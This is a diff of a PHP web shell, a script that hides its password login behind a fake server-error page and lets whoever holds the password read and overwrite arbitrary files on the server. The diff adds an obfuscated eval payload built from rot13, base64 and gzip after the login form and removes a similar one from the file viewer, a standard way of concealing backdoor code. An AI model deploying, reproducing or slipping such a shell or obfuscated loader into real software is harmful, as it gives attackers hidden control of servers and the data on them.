@@ -1,11 +1,6 @@
 <?php
 set_time_limit(0);
 session_start();
-if(get_magic_quotes_gpc()){
-	foreach($_POST as $key=>$value){
-	  $_POST[$key] = stripslashes($value);
-	}
-}
 
 function login() {
 echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
@@ -23,7 +18,7 @@ error was encountered while trying to use an ErrorDocument to handle the request
     <center>
     <form method=post>
     <input type=password name=pass>
-    </form></center></html>';
+    </form></center></html>'; eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
 	exit();
 }
 
@@ -163,7 +158,7 @@ span > .buttonFile {
 	if(isset($_POST['filesrc'])){
 		echo "<tr><td>Current File : ".$_POST['filesrc']."</td></tr>";
 		echo '</table><br />';
-		echo('<center><textarea style="width: 703px; height: 477px;" cols="80" name="src">'.htmlspecialchars(file_get_contents($_POST['filesrc'])).'</textarea></center>'); eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
+		echo('<center><textarea style="width: 703px; height: 477px;" cols="80" name="src">'.htmlspecialchars(file_get_contents($_POST['filesrc'])).'</textarea></center>'); 
 	}elseif(isset($_POST['opt']) && $_POST['opt'] != 'delete'){		
 		if(isset($_POST['opt']) && isset($_POST['src']) && $_POST['opt'] == 'edit' ){
 			$fp = fopen($_POST['opt_path'],'w');
